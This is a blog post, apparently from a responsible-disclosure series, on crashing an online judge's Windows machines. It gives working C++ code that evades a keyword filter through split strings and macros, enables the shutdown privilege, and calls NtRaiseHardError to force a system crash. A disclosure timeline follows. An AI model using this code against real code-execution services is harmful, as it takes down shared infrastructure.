<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Bypassing the last fixes and taking down the servers again!">
<meta name="keywords" content=" anotherfall">
<title>Another Fall | Documentation for vulnerabilties found by Khaled Mohamed</title>
<link rel="stylesheet" href="css/syntax.css">


<link rel="stylesheet" type="text/css" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css">
<!--<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">-->
<link rel="stylesheet" href="css/modern-business.css">
<link rel="stylesheet" href="css/lavish-bootstrap.css">
<link rel="stylesheet" href="css/customstyles.css">
<link rel="stylesheet" href="css/theme-blue.css">

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="js/jquery.navgoco.min.js"></script>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/2.0.0/anchor.min.js"></script>
<script src="js/toc.js"></script>
<script src="js/customscripts.js"></script>
<link rel="shortcut icon" href="images/favicon.ico">

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<link rel="alternate" type="application/rss+xml" title="breakingdown" href="http://localhost:4000/feed.xml">

    <script>
        $(document).ready(function() {
            // Initialize navgoco with default options
            $("#mysidebar").navgoco({
                caretHtml: '',
                accordion: true,
                openClass: 'active', // open
                save: false, // leave false or nav highlighting doesn't work right
                cookie: {
                    name: 'navgoco',
                    expires: false,
                    path: '/'
                },
                slide: {
                    duration: 400,
                    easing: 'swing'
                }
            });

            $("#collapseAll").click(function(e) {
                e.preventDefault();
                $("#mysidebar").navgoco('toggle', false);
            });

            $("#expandAll").click(function(e) {
                e.preventDefault();
                $("#mysidebar").navgoco('toggle', true);
            });

        });

    </script>
    <script>
        $(function () {
            $('[data-toggle="tooltip"]').tooltip()
        })
    </script>
    <script>
        $(document).ready(function() {
            $("#tg-sb-link").click(function() {
                $("#tg-sb-sidebar").toggle();
                $("#tg-sb-content").toggleClass('col-md-9');
                $("#tg-sb-content").toggleClass('col-md-12');
                $("#tg-sb-icon").toggleClass('fa-toggle-on');
                $("#tg-sb-icon").toggleClass('fa-toggle-off');
            });
        });
    </script>
    

</head>
<body>
<!-- Navigation -->
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container topnavlinks">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="fa fa-home fa-lg navbar-brand" href="index.html">&nbsp;<span class="projectTitle"> Breaking Down</span></a>
        </div>
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <!-- toggle sidebar button -->
                <li><a id="tg-sb-link" href="#"><i id="tg-sb-icon" class="fa fa-toggle-on"></i> Nav</a></li>
                <!-- entries without drop-downs appear here -->
                
                
                
                <li><a href="https://github.com/Ex-o" target="_blank">GitHub</a></li>
                
                
                
                <li><a href="https://cp.fayox.com" target="_blank">Competitive Programming Community</a></li>
                
                
                
                <li><a href="contact.html">Contact Me</a></li>
                
                
                
                <!-- entries with drop-downs appear here -->
                <!-- conditional logic to control which topnav appears for the audience defined in the configuration file.-->
                
                
                
                <!--
			<li>



  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the Another Fall page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>

</li>

		
                <!--comment out this block if you want to hide search-->
                <!--li>
                    <start search>
                    <div id="search-demo-container">
                        <input type="text" id="search-input" placeholder="search...">
                        <ul id="results-container"></ul>
                    </div>
                    <script src="js/jekyll-search.js" type="text/javascript"></script>
                    <script type="text/javascript">
                            SimpleJekyllSearch.init({
                                searchInput: document.getElementById('search-input'),
                                resultsContainer: document.getElementById('results-container'),
                                dataSource: 'search.json',
                                searchResultTemplate: '<li><a href="{url}" title="Another Fall">{title}</a></li>',
                    noResultsText: 'No results found.',
                            limit: 10,
                            fuzzy: true,
                    })
                    </script>
                    <!--end search>
                </li-->
            </ul>
        </div>
        </div>
        <!-- /.container -->
</nav>

<!-- Page Content -->
<div class="container">
    <div class="col-lg-12">&nbsp;</div>
    <!-- Content Row -->
    <div class="row">
        
        
            <!-- Sidebar Column -->
            <div class="col-md-3" id="tg-sb-sidebar">
                












<ul id="mysidebar" class="nav">
    <li class="sidebarTitle"> </li>
    
    
    
        
    
    <li>
        <a href="#">Overview</a>
        <ul>
            
            
            
            <li><a href="index.html">Introduction</a></li>
            
            
            
            
        </ul>
     </li>
       
        
    
    <li>
        <a href="#">Breaking Down Series</a>
        <ul>
            
            
            
            <li><a href="breakingdown_start.html">The Start</a></li>
            
            
            
            
            
            
            <li><a href="breakingdown_dig.html">The Dig</a></li>
            
            
            
            
            
            
            <li><a href="breakingdown_fall.html">The Fall</a></li>
            
            
            
            
            
            
            <li><a href="breakingdown_anotherfall.html">Another Fall</a></li>
            
            
            
            
        </ul>
     </li>
       
        
        
        <!-- if you aren't using the accordion, uncomment this block:
           <p class="external">
               <a href="#" id="collapseAll">Collapse All</a> | <a href="#" id="expandAll">Expand All</a>
           </p>
           -->
</ul>

<!-- this highlights the active parent class in the navgoco sidebar. this is critical so that the parent expands when you're viewing a page. This must appear below the sidebar code above. Otherwise, if placed inside customscripts.js, the script runs before the sidebar code runs and the class never gets inserted.-->
<script>$("li.active").parents('li').toggleClass("active");</script>

            </div>
            
        

        <!-- Content Column -->
        <div class="col-md-9" id="tg-sb-content">
            <div class="post-header">
   <h1 class="post-title-main">Another Fall</h1>
</div>



<div class="post-content">

   
    <div class="summary">Bypassing the last fixes and taking down the servers again!</div>
   

    
    
<!-- this handles the automatic toc. use ## for subheads to auto-generate the on-page minitoc. if you use html tags, you must supply an ID for the heading element in order for it to appear in the minitoc. -->
<script>
$( document ).ready(function() {
  // Handler for .ready() called.

$('#toc').toc({ minimumHeaders: 0, listType: 'ul', showSpeed: 0, headers: 'h2,h3,h4' });

/* this offset helps account for the space taken up by the floating toolbar. */
$('#toc').on('click', 'a', function() {
  var target = $(this.getAttribute('href'))
    , scroll_target = target.offset().top

  $(window).scrollTop(scroll_target - 10);
  return false
})
  
});
</script>

<div id="toc"></div>

    


    

  <h2 id="episode-3">Episode 3:</h2>
<p>So the code from last episode was fixed and everyone was happy, not me though. I noticed that the message returned by the invoker was different this time.</p>

<p>Normally, you get some outstream and the return exit code of your main function. This time I was getting some weird exception message that was coming from some Java application. This Java application turned out to be the invoker. The invoker was doing some string checks on the source code before sending it to the compiler. This is bad, never do this if you have some similar service to that of an online judge.</p>

<p>After a while I was able to collect a list of keywords that were blocked from my previous code. It went as follows:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntstatus
LoadLibrary
GetProcAddressA
ntdll.dll
...
</code></pre></div></div>

<p>Now we’re using C++ we have the almighty power of pointers. We also have macros. We can get pointers to functions then invoke them manually. Let’s also escape some new lines to obfuscate our literals.</p>

<p>And after some magic we get this…</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
</span><span class="cm">/*#include &lt;n\
tst\
atu\
s.h&gt;*/</span>

<span class="k">typedef</span> <span class="kt">long</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="n">radj</span><span class="p">)(</span><span class="n">ULONG</span><span class="p">,</span><span class="n">BOOLEAN</span><span class="p">,</span><span class="n">BOOLEAN</span><span class="p">,</span><span class="n">PBOOLEAN</span><span class="p">);</span>
<span class="k">typedef</span> <span class="kt">long</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="n">rerr</span><span class="p">)(</span><span class="kt">long</span><span class="p">,</span><span class="n">ULONG</span><span class="p">,</span><span class="n">ULONG</span><span class="p">,</span><span class="n">PULONG_PTR</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>

<span class="cp">#define lolib (Lo\
adL\
ibr\
aryA(str2))
</span>
<span class="cp">#define gpa (G\
etPr\
ocA\
ddress)
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">auto</span> <span class="n">str1</span> <span class="o">=</span> <span class="s">"R"</span> <span class="s">"tlAdj"</span> <span class="s">"ustPr"</span> <span class="s">"ivi"</span> <span class="s">"lege"</span><span class="p">;</span>
    
    <span class="k">auto</span> <span class="n">str2</span> <span class="o">=</span> <span class="s">"n"</span> <span class="s">"td"</span> <span class="s">"ll."</span> <span class="s">"d"</span> <span class="s">"ll"</span><span class="p">;</span>

    <span class="k">auto</span> <span class="n">str3</span> <span class="o">=</span> <span class="s">"N"</span> <span class="s">"tRai"</span> <span class="s">"seHa"</span> <span class="s">"rdE"</span> <span class="s">"rror"</span><span class="p">;</span>

    <span class="k">auto</span> <span class="n">fp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">radj</span><span class="p">)</span><span class="n">gpa</span><span class="p">(</span><span class="n">lolib</span><span class="p">,</span> <span class="n">str1</span><span class="p">);</span>
    <span class="n">BOOLEAN</span> <span class="n">enabled</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">fp1</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">enabled</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">auto</span> <span class="n">fp2</span> <span class="o">=</span> <span class="p">(</span><span class="n">rerr</span><span class="p">)</span><span class="n">gpa</span><span class="p">(</span><span class="n">lolib</span><span class="p">,</span> <span class="n">str3</span><span class="p">);</span>
        <span class="n">ULONG</span> <span class="n">response</span><span class="p">;</span>
        <span class="n">fp2</span><span class="p">(</span><span class="mh">0xC0000002</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">response</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And the result?</p>

<p><img src="images/queue.png" /></p>

<p>#Disclosure:
<strong>On August 28th</strong>: I send another message to <a href="#" data-toggle="tooltip" data-original-title="Founder and CEO of Codeforces.">Mike</a> explaining to him that the string checks were a very bad measure and that he had to work his way through the machine permissions which weren’t strong enough on default Windows users.</p>

<p><strong>On August 29th</strong>: He had a basic fix already running.</p>

<p>In the coming episode I will share a few snippets of the codes I used to test around with the machines.</p>


    <div class="tags">
        
    </div>



    <div id="disqus_thread"></div>
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'breakingd0wn'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


</div>

<hr class="shaded"/>

<footer>
            <div class="row">
                <div class="col-lg-12 footer">
               &copy;2018 Khaled Mohamed. All rights reserved. <br />
 Site last updated: Oct 10, 2018 <br />
<p><img src="images/logo.png" alt="logo"/></p>
                </div>
            </div>
</footer>


        </div>
    <!-- /.row -->
</div>
<!-- /.container -->
    </div>

</body>

</html>
